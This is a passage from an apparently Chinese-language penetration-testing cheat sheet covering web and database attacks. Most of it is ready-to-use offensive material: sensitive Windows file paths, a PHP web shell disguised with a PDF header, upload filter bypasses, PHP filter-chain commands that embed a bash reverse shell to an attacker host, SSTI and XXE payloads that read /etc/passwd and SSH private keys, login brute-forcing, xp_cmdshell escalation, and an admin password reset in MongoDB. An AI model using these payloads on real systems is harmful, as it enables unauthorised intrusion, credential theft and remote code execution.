class="hljs-built_in">log</span><br>C:/Program Files/FileZilla Server/FileZilla Server.xml<br>C:/Program Files/MySQL/data/hostname.err<br>C:/Program Files/MySQL/data/mysql-bin.<span class="hljs-built_in">log</span><br>C:/Program Files/MySQL/data/mysql.err<br>C:/Program Files/MySQL/data/mysql.<span class="hljs-built_in">log</span><br>C:/Program Files/MySQL/my.ini<br>C:/Program Files/MySQL/my.cnf<br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/data/hostname.err<br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/data/mysql-bin.<span class="hljs-built_in">log</span><br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/data/mysql.err<br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/data/mysql.<span class="hljs-built_in">log</span><br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/my.cnf<br>C:/Program Files/MySQL/MySQL Server <span class="hljs-number">5.0</span>/my.ini<br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/Apache Group/Apache2/conf/httpd.conf<br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/Apache Group/Apache/conf/httpd.conf<br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/Apache Group/Apache/conf/access.<span class="hljs-built_in">log</span><br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/Apache Group/Apache/conf/error.<span class="hljs-built_in">log</span><br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/FileZilla Server/FileZilla Server.xml<br>C:/Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>/xampp/apache/conf/httpd.conf<br>C:/WINDOWS/php.ini<br>C:/WINDOWS/Repair/SAM<br>C:/Windows/repair/system<br>C:/Windows/repair/software<br>C:/Windows/repair/security<br>C:/WINDOWS/System32/drivers/etc/hosts<br>C:/Windows/win.ini<br>C:/WINNT/php.ini<br>C:/WINNT/win.ini<br>C:/xampp/apache/bin/php.ini<br>C:/xampp/apache/logs/access.<span class="hljs-built_in">log</span><br>C:/xampp/apache/logs/error.<span class="hljs-built_in">log</span><br>C:/Windows/Panther/Unattend/Unattended.xml<br>C:/Windows/Panther/Unattended.xml<br>C:/Windows/debug/NetSetup.<span class="hljs-built_in">log</span><br>C:/Windows/system32/config/AppEvent.Evt<br>C:/Windows/system32/config/SecEvent.Evt<br>C:/Windows/system32/config/<span class="hljs-keyword">default</span>.sav<br>C:/Windows/system32/config/security.sav<br>C:/Windows/system32/config/software.sav<br>C:/Windows/system32/config/system.sav<br>C:/Windows/system32/config/regback/<span class="hljs-keyword">default</span><br>C:/Windows/system32/config/regback/sam<br>C:/Windows/system32/config/regback/security<br>C:/Windows/system32/config/regback/system<br>C:/Windows/system32/config/regback/software<br>C:/Program Files/MySQL/MySQL Server 5.1/my.ini<br>C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml<br>C:/Windows/System32/inetsrv/config/applicationHost.config<br>C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<h4 id="PDF-PHP-包含"><a href="#PDF-PHP-包含" class="headerlink" title="PDF PHP 包含"></a>PDF PHP 包含</h4><p>创建一个带有 PDF 标头的文件，其中包含 PHP 代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">%PDF<span class="hljs-number">-1.4</span><br><br>&lt;?php<br>    <span class="hljs-title function_">system</span><span class="hljs-params">($_GET[<span class="hljs-string">&quot;cmd&quot;</span>])</span>;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>利用示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;/index.php?page=uploads/&lt;FILE&gt;.pdf%00&amp;cmd=whoami</span><br></code></pre></td></tr></table></figure>

<h4 id="PHP-上传过滤器绕过"><a href="#PHP-上传过滤器绕过" class="headerlink" title="PHP 上传过滤器绕过"></a>PHP 上传过滤器绕过</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">.sh<br>.cgi<br>.inc<br>.txt<br>.pht<br>.phtml<br>.phP<br>.Php<br>.php3<br>.php4<br>.php5<br>.php7<br>.pht<br>.phps<br>.phar<br>.phpt<br>.pgif<br>.phtml<br>.phtm<br>.php%<span class="hljs-number">00.</span>jpeg<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;FILE&gt;.php%<span class="hljs-number">20</span><br>&lt;FILE&gt;.php%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a.jpg<br>&lt;FILE&gt;.php%<span class="hljs-number">0</span>a<br>&lt;FILE&gt;.php.jpg<br>&lt;FILE&gt;.php%<span class="hljs-number">00.</span>gif<br>&lt;FILE&gt;.php\x00.gif<br>&lt;FILE&gt;.php%<span class="hljs-number">00.</span>png<br>&lt;FILE&gt;.php\x00.png<br>&lt;FILE&gt;.php%<span class="hljs-number">00.</span>jpg<br>&lt;FILE&gt;.php\x00.jpg<br>mv &lt;FILE&gt;.jpg &lt;FILE&gt;.php\x00.jpg<br></code></pre></td></tr></table></figure>

<h4 id="PHP-过滤器链生成器"><a href="#PHP-过滤器链生成器" class="headerlink" title="PHP 过滤器链生成器"></a>PHP 过滤器链生成器</h4><p>参考链接： <a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 php_filter_chain_generator.py --chain <span class="hljs-string">&#x27;&lt;?= exec($_GET[0]); ?&gt;&#x27;</span><br>python3 php_filter_chain_generator.py --chain <span class="hljs-string">&quot;&lt;?php echo shell_exec(id); ?&gt;&quot;</span><br>python3 php_filter_chain_generator.py --chain <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&lt;?php echo shell_exec(id); ?&gt;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>python3 php_filter_chain_generator.py --chain <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>&lt;?php <span class="hljs-title function_">exec</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>/bin/bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;</span><span class="hljs-string">&quot;&quot;</span>)</span>;?&gt;<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>python3 php_filter_chain_generator.py --chain <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>&lt;?php <span class="hljs-title function_">exec</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>/bin/bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;</span><span class="hljs-string">&quot;&quot;</span>)</span>;?&gt;<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 php_filter_chain_generator.py --chain <span class="hljs-string">&#x27;&lt;?= exec($_GET[0]); ?&gt;&#x27;</span><br>[+] The following gadget chain will generate the following code : &lt;?= exec($_GET[<span class="hljs-number">0</span>]); ?&gt; (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)<br>php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|&lt;--- SNIP ---&gt;|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=&lt;COMMAND&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="PHP-通用小工具链-PHPGGC"><a href="#PHP-通用小工具链-PHPGGC" class="headerlink" title="PHP 通用小工具链 (PHPGGC)"></a>PHP 通用小工具链 (PHPGGC)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/&lt;FILE&gt;.txt /PATH/TO/FILE/&lt;FILE&gt;.txt<br></code></pre></td></tr></table></figure>

<h4 id="服务器端请求伪造-SSRF"><a href="#服务器端请求伪造-SSRF" class="headerlink" title="服务器端请求伪造 (SSRF)"></a>服务器端请求伪造 (SSRF)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//&lt;RHOST&gt;/item/2?server=server.&lt;RHOST&gt;/file?id=9&amp;x=</span><br></code></pre></td></tr></table></figure>

<h4 id="服务器端模板注入-SSTI"><a href="#服务器端模板注入-SSTI" class="headerlink" title="服务器端模板注入 (SSTI)"></a>服务器端模板注入 (SSTI)</h4><h5 id="模糊字符串"><a href="#模糊字符串" class="headerlink" title="模糊字符串"></a>模糊字符串</h5><p>参考链接： <a target="_blank" rel="noopener" href="https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti">https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$&#123;&#123;&lt;%[%<span class="hljs-string">&#x27;&quot;&#125;&#125;%\.</span><br></code></pre></td></tr></table></figure>

<h5 id="Magic-Payload"><a href="#Magic-Payload" class="headerlink" title="Magic Payload"></a>Magic Payload</h5><p>参考链接： <a target="_blank" rel="noopener" href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;&#123; ‘’.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__() &#125;&#125;<br></code></pre></td></tr></table></figure>

<h4 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution<br>SVG: Stored XSS / Server-Side Request Forgery<br>GIF: Stored XSS<br>CSV: CSV Injection<br>XML: XXE<br>AVI: Local File Inclusion / Server-Side request Forgery<br>HTML/JS: HTML Injection / XSS / Open Redirect<br>PNG / JPEG: Pixel Flood Attack<br>ZIP: Remote Code Exection via Local File Inclusion<br>PDF / PPTX: Server-Side Request Forgery / Blind XXE<br></code></pre></td></tr></table></figure>

<h4 id="WFUZZ扫描工具"><a href="#WFUZZ扫描工具" class="headerlink" title="WFUZZ扫描工具"></a>WFUZZ扫描工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ/&lt;FILE&gt;.php --hc &#x27;403,404&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /PATH/TO/WORDLIST -c -f &lt;FILE&gt; -u http:<span class="hljs-comment">//&lt;RHOST&gt; --hc 403,404</span><br></code></pre></td></tr></table></figure>

<h5 id="输出有限的自定义扫描"><a href="#输出有限的自定义扫描" class="headerlink" title="输出有限的自定义扫描"></a>输出有限的自定义扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /PATH/TO/WORDLIST -u http:<span class="hljs-comment">//&lt;RHOST&gt;/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20</span><br></code></pre></td></tr></table></figure>

<h5 id="一次模糊测试两个参数"><a href="#一次模糊测试两个参数" class="headerlink" title="一次模糊测试两个参数"></a>一次模糊测试两个参数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;:/&lt;directory&gt;/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c</span><br></code></pre></td></tr></table></figure>

<h5 id="子域名扫描枚举"><a href="#子域名扫描枚举" class="headerlink" title="子域名扫描枚举"></a>子域名扫描枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz --hh <span class="hljs-number">0</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-5000.</span>txt -H <span class="hljs-string">&#x27;Host: FUZZ.&lt;RHOST&gt;&#x27;</span> -u http:<span class="hljs-comment">//&lt;RHOST&gt;/</span><br></code></pre></td></tr></table></figure>

<h5 id="虚拟主机子域名扫描枚举"><a href="#虚拟主机子域名扫描枚举" class="headerlink" title="虚拟主机子域名扫描枚举"></a>虚拟主机子域名扫描枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt -H <span class="hljs-string">&quot;Host: FUZZ.&lt;RHOST&gt;&quot;</span> --hc <span class="hljs-number">200</span> --hw <span class="hljs-number">356</span> -t <span class="hljs-number">100</span> &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="GET型目录枚举扫描"><a href="#GET型目录枚举扫描" class="headerlink" title="GET型目录枚举扫描"></a>GET型目录枚举扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ --hc 403,404</span><br></code></pre></td></tr></table></figure>

<h5 id="POST登录爆破枚举扫描"><a href="#POST登录爆破枚举扫描" class="headerlink" title="POST登录爆破枚举扫描"></a>POST登录爆破枚举扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -X POST -u <span class="hljs-string">&quot;http://&lt;RHOST&gt;:&lt;RPORT&gt;/login.php&quot;</span> -d <span class="hljs-string">&quot;email=FUZZ&amp;password=&lt;PASSWORD&gt;&quot;</span> -w /PATH/TO/WORDLIST/&lt;WORDLIST&gt;.txt --hc <span class="hljs-number">200</span> -c<br><br>wfuzz -X POST -u <span class="hljs-string">&quot;http://&lt;RHOST&gt;:&lt;RPORT&gt;/login.php&quot;</span> -d <span class="hljs-string">&quot;username=FUZZ&amp;password=&lt;PASSWORD&gt;&quot;</span> -w /PATH/TO/WORDLIST/&lt;WORDLIST&gt;.txt --ss <span class="hljs-string">&quot;Invalid login&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="SQL枚举扫描"><a href="#SQL枚举扫描" class="headerlink" title="SQL枚举扫描"></a>SQL枚举扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d <span class="hljs-string">&#x27;db=FUZZ&#x27;</span> --hl <span class="hljs-number">16</span> http:<span class="hljs-comment">//&lt;RHOST&gt;/select http</span><br></code></pre></td></tr></table></figure>

<h5 id="虚拟主机子域名系统扫描"><a href="#虚拟主机子域名系统扫描" class="headerlink" title="虚拟主机子域名系统扫描"></a>虚拟主机子域名系统扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt -H <span class="hljs-string">&quot;Origin: http://FUZZ.&lt;RHOST&gt;&quot;</span> --filter <span class="hljs-string">&quot;r.headers.response~&#x27;Access-Control-Allow-Origin&#x27;&quot;</span> http:<span class="hljs-comment">//&lt;RHOST&gt;/</span><br><br>wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt --hc <span class="hljs-number">400</span>,<span class="hljs-number">404</span>,<span class="hljs-number">403</span> -H <span class="hljs-string">&quot;Host: FUZZ.&lt;RHOST&gt;&quot;</span> -u http:<span class="hljs-comment">//&lt;RHOST&gt; -t 100</span><br><br>wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt --hc <span class="hljs-number">400</span>,<span class="hljs-number">403</span>,<span class="hljs-number">404</span> -H <span class="hljs-string">&quot;Host: FUZZ.&lt;RHOST&gt;&quot;</span> -u http:<span class="hljs-comment">//&lt;RHOST&gt; --hw &lt;value&gt; -t 100</span><br></code></pre></td></tr></table></figure>

<h5 id="对文件进行编号"><a href="#对文件进行编号" class="headerlink" title="对文件进行编号"></a>对文件进行编号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -w /usr/share/wordlists/seclists/Fuzzing/<span class="hljs-number">4</span>-digits<span class="hljs-number">-0000</span><span class="hljs-number">-9999.</span>txt --hw <span class="hljs-number">31</span> http:<span class="hljs-comment">//10.13.37.11/backups/backup_2021052315FUZZ.zip</span><br></code></pre></td></tr></table></figure>

<h5 id="枚举-PID"><a href="#枚举-PID" class="headerlink" title="枚举 PID"></a>枚举 PID</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wfuzz -u <span class="hljs-string">&#x27;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline&#x27;</span> -z range,<span class="hljs-number">900</span><span class="hljs-number">-1000</span><br></code></pre></td></tr></table></figure>

<h4 id="WPSCAN-扫描工具"><a href="#WPSCAN-扫描工具" class="headerlink" title="WPSCAN 扫描工具"></a>WPSCAN 扫描工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">wpscan --url https:<span class="hljs-comment">//&lt;RHOST&gt; --enumerate u,t,p</span><br>wpscan --url https:<span class="hljs-comment">//&lt;RHOST&gt; --plugins-detection aggressive</span><br>wpscan --url https:<span class="hljs-comment">//&lt;RHOST&gt; --disable-tls-checks</span><br>wpscan --url https:<span class="hljs-comment">//&lt;RHOST&gt; --disable-tls-checks --enumerate u,t,p</span><br>wpscan --url http:<span class="hljs-comment">//&lt;RHOST&gt; -U &lt;USERNAME&gt; -P passwords.txt -t 50</span><br></code></pre></td></tr></table></figure>

<h4 id="XML-外部实体-XXE"><a href="#XML-外部实体-XXE" class="headerlink" title="XML 外部实体 (XXE)"></a>XML 外部实体 (XXE)</h4><h5 id="恶意文件有效负载请求"><a href="#恶意文件有效负载请求" class="headerlink" title="恶意文件有效负载请求"></a>恶意文件有效负载请求</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: &lt;RHOST&gt;:&lt;RPORT&gt;<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">68.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">68.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Length: 136</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://&lt;LHOST&gt;:80/shell.php&quot; &gt;]&gt;</span><br><span class="hljs-comment">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;!DOCTYPE xxe [ &lt;!ENTITY passwd SYSTEM <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>&gt; ]&gt;<br> &lt;stockCheck&gt;&lt;productId&gt;&amp;passwd;&lt;/productId&gt;&lt;storeId&gt;<span class="hljs-number">1</span>&lt;/storeId&gt;&lt;/stockCheck&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM <span class="hljs-string">&#x27;file:///c:/windows/win.ini&#x27;</span>&gt;]&gt;&lt;order&gt;&lt;quantity&gt;<span class="hljs-number">3</span>&lt;/quantity&gt;&lt;item&gt;&amp;test;&lt;/item&gt;&lt;address&gt;<span class="hljs-number">17</span>th Estate, CA&lt;/address&gt;&lt;/order&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">username=%<span class="hljs-number">26u</span>sername%<span class="hljs-number">3b</span>&amp;version=<span class="hljs-number">1.0</span><span class="hljs-number">.0</span>--&gt;&lt;!DOCTYPE+username+[+&lt;!ENTITY+username+SYSTEM+<span class="hljs-string">&quot;/root/.ssh/id_rsa&quot;</span>&gt;+]&gt;&lt;!--<br></code></pre></td></tr></table></figure>

<h3 id="数据库分析工具"><a href="#数据库分析工具" class="headerlink" title="数据库分析工具"></a>数据库分析工具</h3><h4 id="impacket-mssqlclient"><a href="#impacket-mssqlclient" class="headerlink" title="impacket-mssqlclient"></a>impacket-mssqlclient</h4><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">enum_logins<br>enum_impersonate<br></code></pre></td></tr></table></figure>

<h5 id="连接并登录"><a href="#连接并登录" class="headerlink" title="连接并登录"></a>连接并登录</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-mssqlclient &lt;USERNAME&gt;@&lt;RHOST&gt;<br>impacket-mssqlclient &lt;USERNAME&gt;@&lt;RHOST&gt; -windows-auth<br>sudo mssqlclient.py &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;USERNAME&gt;@&lt;RHOST&gt; -windows-auth<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache # （导入票据）<br>impacket-mssqlclient -k &lt;RHOST&gt;.&lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">exec_as_login sa<br>enable_xp_cmdshell<br>xp_cmdshell whoami<br></code></pre></td></tr></table></figure>

<h4 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mongo <span class="hljs-string">&quot;mongodb://localhost:27017&quot;</span><br></code></pre></td></tr></table></figure>

<p>基本操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; use &lt;DATABASE&gt;;<br>&gt; show tables;<br>&gt; show collections;<br>&gt; db.system.keys.find();<br>&gt; db.users.find();<br>&gt; db.getUsers();<br>&gt; db.getUsers(&#123;showCredentials: <span class="hljs-literal">true</span>&#125;);<br>&gt; db.accounts.find();<br>&gt; db.accounts.find().pretty();<br>&gt; use admin;<br></code></pre></td></tr></table></figure>

<h5 id="用户密码重置为“12345”"><a href="#用户密码重置为“12345”" class="headerlink" title="用户密码重置为“12345”"></a>用户密码重置为“12345”</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; db.getCollection(<span class="hljs-string">&#x27;users&#x27;</span>).update(&#123;username:<span class="hljs-string">&quot;admin&quot;</span>&#125;, &#123; $<span class="hljs-built_in">set</span>: &#123;<span class="hljs-string">&quot;services&quot;</span> : &#123; <span class="hljs-string">&quot;password&quot;</span> : &#123;<span class="hljs-string">&quot;bcrypt&quot;</span> : <span class="hljs-string">&quot;$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&quot;</span> &#125; &#125; &#125; &#125;)<br></code></pre></td></tr></table></figure>

<h4 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h4><h5 id="连接并登录-1"><a href="#连接并登录-1" class="headerlink" title="连接并登录"></a>连接并登录</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlcmd -S &lt;RHOST&gt; -U &lt;USERNAME&gt;<br>sqlcmd -S &lt;RHOST&gt; -U &lt;USERNAME&gt; -P <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="显示数据库内容"><a href="#显示数据库内容" class="headerlink" title="显示数据库内容"></a>显示数据库内容</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&gt; SELECT name FROM master.sys.databases<br><span class="hljs-number">2</span>&gt; go<br></code></pre></td></tr></table></figure>

